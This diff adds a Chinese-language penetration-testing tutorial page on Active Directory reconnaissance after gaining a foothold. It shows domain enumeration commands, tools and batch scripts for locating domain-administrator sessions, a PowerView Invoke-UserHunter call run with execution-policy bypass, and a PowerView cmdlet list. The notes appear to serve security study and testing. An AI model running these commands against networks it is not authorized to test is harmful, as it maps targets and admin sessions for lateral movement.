+<td>SVN泄露、未授权访问</td>
+</tr>
+<tr>
+<td align="left">50000</td>
+<td>SAP Management Console</td>
+<td>远程执行</td>
+</tr>
+</tbody></table>
+<h2 id="2-7-搜集域内基础信息"><a href="#2-7-搜集域内基础信息" class="headerlink" title="2.7 搜集域内基础信息"></a>2.7 搜集域内基础信息</h2><p>​        确定了当前内网拥有的域，且所控制的主机在域内，就可以进行域内相关信息的收集了。因为本节将要介绍的查询命令在本质上都是通过<code>LDAP</code> 协议到域控制器上进行查询的，所以在查询时需要进行权限认证。只有域用户才拥有此权限，本地用户无法运行本节介绍的查询命令(System权限用户除外。在域中，除普通用户外，所有的机器都有一个机器用户，其用户名为机器名加上<code>$</code>。System权限用户对应的就是域里面的机器用户，所以<code>System</code>权限用户可以运行。</p>
+<p>​    在域环境中，域用户默认是可以登录域内任何一台机器的，这是因为域管理员在新增域用户时该域用户默认就会存在域用户组 Domain Users 中，加入域的域成员机器会默认将全局组 Domain Users 加到其本地的 User 组中，而域成员机器本地组策略中的 “允许在本地登陆” 属性中包含了本地的 Users 组。    </p>
+<p><strong>A. 查询域</strong></p>
+<pre><code class="hljs powershell">net view /domain</code></pre>
+
+<p><strong>B. 查询域内所有计算机</strong></p>
+<p>可通过查询到的主机名对主机角色进行初步判断，dev、web\app、NAS可能分别对应开发服务器、Web服务器、存储服务器。</p>
+<pre><code class="hljs powershell">net view /domain:<span class="hljs-built_in">TEST-2012</span></code></pre>
+
+<p>如果报错 <code>发生系统错误  6118</code>，首先需要检查防火墙，其次检查<code>Server </code>，<code>WorkStation</code>，<code>computer Browser</code>三项服务是否启动，一般都是<code>computer Browser</code>需要手动启动导致的，最后检查计算机是否安装<code>SMB1.0/CIFS 文件共享支持</code>功能。</p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414103633042.png" alt="image-20220414103633042"></p>
+<p><strong>C. 查询域内所有用户组列表</strong></p>
+<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> /domain</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414181625791.png" alt="image-20220414181625791"></p>
+<p>可以看到，该域内有13个组。系统自带的常见用户身份如下。</p>
+<ul>
+<li>Domain Admins:域管理员。</li>
+<li>Domain Computers:域内机器。</li>
+<li>Domain Controllers:域控制器。</li>
+<li>Domain Guest::域访客，权限较低。</li>
+<li>Domain Users:域用户。</li>
+<li>Enterprise Admins:企业系统管理员用户。</li>
+</ul>
+<p>在默认情况下，Domain Admins和Enterprise Admins对域内所有域控制器有完全控制权限。</p>
+<p><strong>D. 查询所有域成员计算机列表</strong></p>
+<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain</code></pre>
+
+<p><strong>E. 获取域密码策略信息</strong></p>
+<pre><code class="hljs powershell">net accounts /domain</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414193704134.png" alt="image-20220414193704134"></p>
+<p><strong>F. 获取域信任信息</strong></p>
+<pre><code class="hljs powershell">nltest /domain_trusts</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414193823734.png" alt="image-20220414193823734"></p>
+<h2 id="2-8-查找域控制器"><a href="#2-8-查找域控制器" class="headerlink" title="2.8 查找域控制器"></a>2.8 查找域控制器</h2><pre><code class="hljs powershell"><span class="hljs-comment"># 查看域控制器的机器名</span>
+nltest /DCLIST:<span class="hljs-built_in">TEST-2012</span>
+<span class="hljs-comment"># 查看域控制器的主机名</span>
+Nslookup <span class="hljs-literal">-type</span>=SRV _ldap._tcp
+<span class="hljs-comment"># 查看当前时间（通常时间服务器为主域控制器）</span>
+net time /domain
+<span class="hljs-comment"># 查看域控制器组</span>
+net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain
+<span class="hljs-comment"># 查看域控制器的机器名为”DC“</span>
+netdom query pdc</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414222331712.png" alt="image-20220414222331712"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414222440944.png" alt="image-20220414222440944"></p>
+<h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查询域管理员用户</span>
+net group &quot;domain admins&quot; /domain
+<span class="hljs-meta">#</span><span class="bash"> 查询管理员用户组</span>
+net group &quot;Enterprise Admins&quot; /domain</code></pre>
+
+<h2 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h2><h3 id="2-10-1-域管理员定位概述"><a href="#2-10-1-域管理员定位概述" class="headerlink" title="2.10.1 域管理员定位概述"></a>2.10.1 域管理员定位概述</h3><p>​        在内网中，通常会部署大量的网络安全系统和设备，例如IDS、IPS、日志审计、安全网关、反病毒软件等。在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限。</p>
+<p>​        在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，且具备完全控制权限。</p>
+<p>​        定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或<code>Wevtutil</code>工具导出并查看。会话是指域内每台机器的登录会话，可以使用 <code>netsess.exe</code> 或 <code>PowerView</code> 等工具查询（可以匿名查询，不需要权限)。</p>
+<h3 id="2-10-2-常用域管理员定位工具"><a href="#2-10-2-常用域管理员定位工具" class="headerlink" title="2.10.2 常用域管理员定位工具"></a>2.10.2 常用域管理员定位工具</h3><p>​        假设已经在<code>Windows</code> 域中取得了普通用户权限，希望在域内横向移动，需要知道域内用户登录的位置、他是否是任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组，有助于更好地了解域的布局。</p>
+<p>​        常用的域管理员定位工具有 <code>psloggedon.exe</code>、<code>PVEFindADUser.exe</code>、<code>netsess.exe</code>，以及 <code>hunter</code> 、<code>NetView</code> 等。在 <code>PowerShell</code>中，常用的工具是 <code>PowerView</code>。</p>
+<p><strong>1.psloggedon.exe</strong></p>
+<p>​        在 Windows 平台上，可以执行命令<code>net session</code>来查看谁使用了本机资源，但是没有命令可以用来查看谁在使用远程计算机资源、谁登录了本地或远程计算机。使用<code>psloggedon.exe</code>，可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定的是用户名而不是计算机名，<code>psloggedon.exe</code> 会搜索网上邻居中的计算机，并显示该用户当前是否已经登录。其原理是通过检查注册表 <code>HKEY_USERS</code> 项的 key 值来查询谁登录过(需要调用<code>NetSessionEnum API</code>)，但某些功能需要管理员权限才能使用。</p>
+<p>​        <code>psloggedon.exe</code> 的下载地址见:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0%EF%BC%9A%60psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon，使用如下命令及参数：`psloggedon</a> [-] [-l] [-x] [\computername|username]`</p>
+<ul>
+<li><p>[-]: 显示支持的选项和用于输出值的单位。</p>
+</li>
+<li><p>[-l]: 仅显示本地登录，不显示本地和网络资源登录。</p>
+</li>
+<li><p>[-x]: 不显示登录时间。</p>
+</li>
+<li><p>[\computername]: 指定要列出登录信息的计算机的名称。</p>
+</li>
+<li><p>[username]: 指定用户名，在网络中搜索该用户登录的计算机。</p>
+</li>
+</ul>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220505064148110.png" alt="image-20220505064148110" style="zoom:67%;" />
+
+
+
+<p><strong>2. PVEFindADUser.exe</strong></p>
+<p>​        <code>PVEFindADUser.exe</code> 可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 <strong>NET Framework2.0</strong> 环境，并且需要具有管理员权限。</p>
+<p>​        <code>PVEFindADUser.exe</code>的下载地址：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0%EF%BC%9A">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn，使用如下命令及参数：</a></p>
+<ul>
+<li><p>-h: 显示帮助信息。</p>
+</li>
+<li><p>-u: 检查程序是否有新版本。</p>
+</li>
+<li><p>-current[“username”]: 如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名(Domain\Username)，则显示该用户登录的计算机。</p>
+</li>
+<li><p>-last[“username”]: 如果仅指定了-last参数，将获取目标计算机的最后一个登录用户。如果指定了用户名（Domain\Username),则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户名，此时使用该工具可能无法得到该用户名。</p>
+</li>
+<li><p>-noping: 阻止该工具在尝试获取用户登录信息之前对目标计算机执行ping命令。</p>
+</li>
+<li><p>-target: 可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。如果指定了此参数，则后跟一个由逗号分隔的主机名列表。</p>
+</li>
+</ul>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220505084347500.png" alt="image-20220505084347500" style="zoom:67%;" />
+
+<p>直接运行<code>pveadfinduser.exe -current</code>命令，即可显示域中所有计算机（计算机、服务器、域控制器等)上当前登录的所有用户。查询结果将被输出到 report.csv 文件中。</p>
+<p><strong>3.Netview.exe</strong><br>        <code>netview.exe</code>是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话，利用 NetShareEnum 找寻共享，利用 Net WkstaUserEnum枚举登录的用户。同时，netview.exe能够查询共享入口和有价值的用户。netview.exe的绝大部分功能不需要管理员权限就可以使用，netview.exe的下载地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/netview/releases/tag/latest">https://github.com/mubix/netview/releases/tag/latest</a></p>
+<p>其命令格式及参数如下：</p>
+<ul>
+<li><p>h: 显示帮助信息。</p>
+</li>
+<li><p>-f filename.txt: 指定要提取主机列表的文件。</p>
+</li>
+<li><p>-e filename.txt: 指定要排除的主机名的文件。</p>
+</li>
+<li><p>-o filename.txt: 将所有输出重定向到指定的文件。</p>
+</li>
+<li><p>-d domain: 指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表。</p>
+</li>
+<li><p>-g group: 指定搜索的组名。如果没有指定，则在Domain Admins组中搜索。</p>
+</li>
+<li><p>-c: 对已找到的共享目录/文件的访问权限进行检查。</p>
+</li>
+</ul>
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220505095404707.png" alt="image-20220505095404707" style="zoom:50%;" />
+
+<p><strong>4.Nmap的NSE脚本</strong></p>
+<p>​        如果存在域账户或者本地账户，就可以使用Nmap的<code>smb-enum-sessions.nse</code>引擎获取远程机器的登录会话〔不需要管理员权限)，下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
+<pre><code class="hljs bash">nmap --script=smb-os-discovery.nse 192.168.0.197</code></pre>
+
+<ul>
+<li>smb-enum-domains.nse： 对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等。</li>
+<li>smb-enum-users.nse：在进行域渗透测试时，如果获得了域内某台主机的权限，但是权限有限，无法获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描。</li>
+<li>smb-enum-shares.nse：遍历远程主机的共享目录。</li>
+<li>smb-enum-processes.nse：对主机的系统进程进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</li>
+<li>smb-enum-sessions.nse：获取域内主机的用户登录会话，查看当前是否有用户登录。</li>
+<li>smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息。</li>
+</ul>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220601003437112.png" alt="image-20220601003437112" style="zoom:50%;" />
+
+<p><strong>5.PowerView脚本</strong></p>
+<p>​       PowerView是一款PowerShell脚本，提供了辅助定位关键用户的功能，其下载地址：</p>
+<ul>
+<li><p>Invoke-StealthUserHunter：只需要进行一次查询，就可以获取域里面的所有用户。使用方法为，从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSessions获取。因为不需要使用Invoke-UserHunter对每台机器进行操作，所以这个方法的隐蔽性相对较高(但涉及的机器不一定全面)。PowerView 默认使用 Invoke-StealthUserHunter，如果找不到，就使用Invoke-UserHunter。</p>
+</li>
+<li><p>Invoke-UserHunter：找到域内特定的用户群，接收用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用 Get-NetSessions 和 Get-NetLoggedon（调用NetSessionEnum和NetWkstaUserEnum API) 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时<strong>不需要管理员权限</strong>。</p>
+</li>
+</ul>
+<pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;&amp;&#123;Import-Module .\PowerView.ps1;Invoke-UserHunter&#125;&quot;</span></code></pre>
+
+<p>​    <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220601011239130.png" alt="image-20220601011239130"></p>
+<p><strong>6.Empire的user_hunter模块</strong></p>
+<p>​        在Empire中也有类似Invoke-UserHunter的模块一user hunter。这个模块用于查找域管理员登录的机器。使用<code>usemodule situational awareness/network/powerview/user_hunter</code>模块，可以清楚地看到哪个用户登录了哪台主机。</p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220602111555677.png" alt="image-20220602111555677"></p>
+<h2 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h2><p>​        在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或者通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p>
+<h3 id="2-11-1-本机检查"><a href="#2-11-1-本机检查" class="headerlink" title="2.11.1 本机检查"></a>2.11.1 本机检查</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1、获取域管理员列表</span>
+net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain
+<span class="hljs-comment"># 2、列出本机的所有进程以及进程用户</span>
+tasklist /v
+<span class="hljs-comment"># 3、寻找进程为管理的的进程</span></code></pre>
+
+<h3 id="2-11-2-查询域控制器的域用户会话"><a href="#2-11-2-查询域控制器的域用户会话" class="headerlink" title="2.11.2 查询域控制器的域用户会话"></a>2.11.2 查询域控制器的域用户会话</h3><p>​        查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话的系统列表。</p>
+<p><strong>1、查询域控制器列表</strong></p>
+<p>​       可以使用LDAP查询从Domain Controllers 单元中搜集的域控制器列表。也可以使用net 命令查询域控制器列表。</p>
+<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain</code></pre>
+
+<p><strong>2、收集域管理员列表</strong></p>
+<p>​       可以使用LDAP进行查询。也可以使用net命令，从域管理员组中收集域管理员列表.</p>
+<pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain</code></pre>
+
+<p><strong>3、搜集所有活动域的会话列表</strong></p>
+<p>​       使用<code>netsess.exe</code>查询每个域控制器，收集所有活动域会话列表。<code>netsess.exe</code>是一个很棒的工具，它包含本地Windows函数<code>netsessionenum</code>。<code>netsessionenum</code>函数用于返回活动会话的IP地址、域账户、会话开始时间和空闲时间。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
+<p>操作说明：</p>
+<pre><code class="hljs plaintext">PS C:\Users\lisi&gt; .\NetSess.exe /?
+
+   -full          完整会话信息（需要管理员）
+   -h servername  指定服务器
+   -u username    要筛选的用户名
+   -c client name 指定客户端名称
+   
+  Ex1:
+    netsess
+      显示本地计算机的会话信息
+
+  Ex2:
+    netsess servername
+      显示服务器的会话信息
+
+  Ex3:
+    netsess servername /full
+      显示服务器的完整会话信息</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220603181811139.png" alt="image-20220603181811139"></p>
+<p><strong>4、交叉引用域管理员列表与活动会话列表</strong></p>
+<p>​      对域管理员列表和活动会话列表进行交叉引用，可以确定哪些P地址有<strong>活动域令牌</strong>。也可以通过下列脚本快速使用<code>netsess.exe</code>的Windows命令行。将域控制器列表添加到dcs.txt中，将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下。运行以下脚本，会在当前目录下生成一个文本文件sessions.txt。</p>
+<pre><code class="hljs vbscript"># bat 脚本（多加%号）
+@echo off
+<span class="hljs-keyword">FOR</span> /F %%i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @echo [+] Querying DC %%i &amp;&amp; @NetSess.exe -h %%i <span class="hljs-number">2</span>&gt;nul&gt;sessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %%a <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @type sessions.txt | @findstr /I %%a
+
+# cmd命令行
+<span class="hljs-keyword">FOR</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @echo [+] Querying DC %i &amp;&amp; @netsess -h %i <span class="hljs-number">2</span>&gt;nul &gt; sessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %a <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @type sessions.txt | @findstr /I %a</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604005143711.png" alt="image-20220604005143711"></p>
+<p>其他脚本：[Get Domain Admins（GDA）、Get Domain Users（GDU），下载链接：<a target="_blank" rel="noopener" href="https://github.com/nullbind/Other-Projects">https://github.com/nullbind/Other-Projects</a></p>
+<h3 id="2-11-3-查询远程系统中运行的任务"><a href="#2-11-3-查询远程系统中运行的任务" class="headerlink" title="2.11.3 查询远程系统中运行的任务"></a>2.11.3 查询远程系统中运行的任务</h3><p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。首先，从Domain Admins组中收集域管理员列表，命令如下：</p>
+<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain</code></pre>
+
+<p>运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中。</p>
+<pre><code class="hljs powershell"><span class="hljs-keyword">FOR</span> /F %i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password <span class="hljs-number">2</span>&gt;NUL &gt; output.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %n <span class="hljs-keyword">in</span> (names.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found running a <span class="hljs-keyword">process</span> on %i &amp;&amp; pause
+
+<span class="hljs-comment"># </span>
+@<span class="hljs-built_in">echo</span> off
+<span class="hljs-keyword">FOR</span> /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">echo</span> [+] %%i &amp;&amp; @tasklist /V /S %%i /U user /P password <span class="hljs-number">2</span>&gt;NUL &gt; output.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %%n <span class="hljs-keyword">in</span> (names.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> output.txt | findstr %%n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %%n was found running a <span class="hljs-keyword">process</span> on %%i &amp;&amp; pause</code></pre>
+
+<h3 id="2-11-4-扫描远程系统的NetBIOS信息"><a href="#2-11-4-扫描远程系统的NetBIOS信息" class="headerlink" title="2.11.4 扫描远程系统的NetBIOS信息"></a>2.11.4 扫描远程系统的NetBIOS信息</h3><p>​        某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。下面这个Windows命令行脚本就用于扫描远程系统活跃域中的管理会话。</p>
+<pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat <span class="hljs-literal">-A</span> %i <span class="hljs-number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %n <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604015055474.png" alt="image-20220604015055474"></p>
+<p>利用nbtscan扫描：<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/InformationGathering/tree/master/nbtscan">https://github.com/SevenC-base/InformationGathering/tree/master/nbtscan</a></p>
+<pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span>[+] Checking %i &amp;&amp; nbtscan <span class="hljs-operator">-f</span> %i <span class="hljs-number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %n <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604015430681.png" alt="image-20220604015430681"></p>
+<h2 id="2-12-域管理员方法模拟简介"><a href="#2-12-域管理员方法模拟简介" class="headerlink" title="2.12 域管理员方法模拟简介"></a>2.12 域管理员方法模拟简介</h2><p>​        在渗透测试中，如果已经拥有一个meterpreter会话，就可以使用<code>incognito</code>来模拟域管理员或者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员。具体操作方法将在第4章详细讲解，见 4.5.1。</p>
+<h2 id="2-13-利用power-shell收集域内信息"><a href="#2-13-利用power-shell收集域内信息" class="headerlink" title="2.13 利用power shell收集域内信息"></a>2.13 利用power shell收集域内信息</h2><p>​        PowerShell是微软推出的一款用于满足管理员对操作系统及应用程序易用性和扩展性需求的脚本环境，可以说是cmd.exe的加强版。作为微软官方推出的脚本语言，在Windows操作系统中的强大功能众所周知：系统管理员可以利用它提高Windows管理工作的自动化程度；渗透测试人员可以利用它更好地进行系统安全测试。</p>
+<ul>
+<li>PowerShell 2.0 内置在 Windows Server 2008 和 Windows 7 中</li>
+<li>PowerShell 3.0 内置在 Windows Server 2012 和 Windows 8 中</li>
+<li>PowerShell 4.0 内置在 Windows Server 2012 R2 和 Windows 8.1中</li>
+<li>PowerShell 5.0 内置在 Windows Server 2016 和 Windows 10 中</li>
+</ul>
+<pre><code class="hljs powershell"><span class="hljs-comment"># 查看powershell版本</span>
+<span class="hljs-variable">$PSVersionTable</span>.PSVersion</code></pre>
+
+<p>Powershell有六种执行策略：</p>
+<ul>
+<li><code>Unrestricted</code> 权限最高，可以不受限制执行任意脚本</li>
+<li><code>Restricted</code> 默认策略，不允许任意脚本的执行</li>
+<li><code>AllSigned</code> 所有脚本必须经过签名运行</li>
+<li><code>RemoteSigned</code> 本地脚本无限制，但是对来自网络的脚本必须经过签名</li>
+<li><code>Bypass</code>  没有任何限制和提示</li>
+<li><code>Undefined</code> 没有设置脚本的策略</li>
+</ul>
+<pre><code class="hljs powershell"><span class="hljs-comment"># 获取当前执行策略 </span>
+<span class="hljs-built_in">Get-ExecutionPolicy</span>
+<span class="hljs-comment"># 更改执行策略 </span>
+<span class="hljs-built_in">Set-ExecutionPolicy</span> <span class="hljs-literal">-ExecutionPolicy</span> Unrestricted</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604110450583.png" alt="image-20220604110450583"></p>
+<p>​           PowerView 是一款依赖 PowerShell 和 WMI 对内网进行查询的常用渗透测试脚本，它集成在 PowerSploit 工具包中，下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit%E3%80%82%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AAPowerShell%E7%AA%97%E5%8F%A3%EF%BC%8C%E8%BF%9B%E5%85%A5PowerSploit%E7%9B%AE%E5%BD%95%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%93%E5%BC%80Recon%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4%60Import-Module">https://github.com/PowerShellMafia/PowerSploit。打开一个PowerShell窗口，进入PowerSploit目录，然后打开Recon目录，输入命令`Import-Module</a> .\PowerView.ps1`，导入脚本。</p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604111942904.png" alt="image-20220604111942904"></p>
+<p>常用命令如下：</p>
+<ol>
+<li>Get-NetDomain 获取当前用户所在域的名称</li>
+<li>Get-NetUser 获取所有用户的详细信息</li>
+<li>Get-NetDomainController 获取所有域控制器的信息</li>
+<li>Get-NetComputer 获取域内所有机器的详细信息</li>
+<li>Get-NetPrinter 获取域中所有当前计算机对象的数组</li>
+<li>Get-NetOU 获取域内的OU信息</li>
+<li>Get-NetGroup 获取所有域内组和组成员的信息</li>
+<li>Get-NetGroupMember 获取指定域组中所有当前用户的列表</li>
+<li>Get-NetFileServer 根据SPN获取当前域使用的文件服务器信息</li>
+<li>Get-NetShare 获取当前域内所有的网络共享信息</li>
+<li>Get-DFSshare 获取域上所有分发文件系统共享的列表</li>
+<li>Get-NetSubnet 获取域的其他网段</li>
+<li>Get-NetSite 获取域内的当前站点</li>
+<li>Get-NetDomainTrust 获取当前用户域的所有信任</li>
+<li>Get-NetForestTrust 获取与当前用户的域关联的林的所有信任</li>
+<li>Find-ForeignUser 枚举在其主域之外的组中的用户</li>
+<li>Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的用户</li>
+<li>Invoke-MapDomainTrust 尝试构建所有域信任的关系映射</li>
+<li>Get-NetLoggedon 获取主动登录到指定服务器的用户</li>
+<li>Get-NetLocalGroup 获取一个或多个远程主机上本地组的成员</li>
+<li>Get-NetSession 获取指定服务器的会话</li>
+<li>Get-NetRDPSession 获取指定服务器的远程连接</li>
+<li>Get-NetProcess 获取远程主机的进程</li>
+<li>Get-UserEvent 获取指定用户的日志</li>
+<li>Get-ADObject 获取活动目录的对象</li>
+<li>Get-NetGPO 获取域内所有的组策略对象</li>
+<li>Get-NetGPOGroup 获取域中设置”受限组”的所有GPO</li>
+<li>Find-GPOLocation 获取用户/组，并通过GPO枚举和关联使其具有有效权限的计算机</li>
+<li>Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限</li>
+<li>Get-DomainPolicy 获取域默认策略或域控制器策略</li>
+<li>Get-DomainSID 返回指定域的SID</li>
+<li>Invoke-UserHunter 获取域用户登录的计算机信息及该用户是否有本地管理员权限</li>
+<li>Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定用户</li>
+<li>Invoke-UserEventHunter 根据用户日志查询某域用户登陆过哪些域机器</li>
+<li>Invoke-ShareFinder 在本地域中的主机上查找（非标准）共享</li>
+<li>Invoke-FileFinder 在本地域中的主机上查找潜在的敏感文件</li>
+<li>Find-LocalAdminAccess 在域上查找当前用户具有本地管理员访问权限的计算机</li>
+<li>Find-ManagedSecurityGroups 搜索受管理的活动目录安全组并标识对其具有写访问权限的用户，即这些组拥有添加或删除成员的能力</li>
+<li>Get-ExploitableSystem 发现系统可能易受常见攻击</li>
+<li>Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员</li>
+</ol>
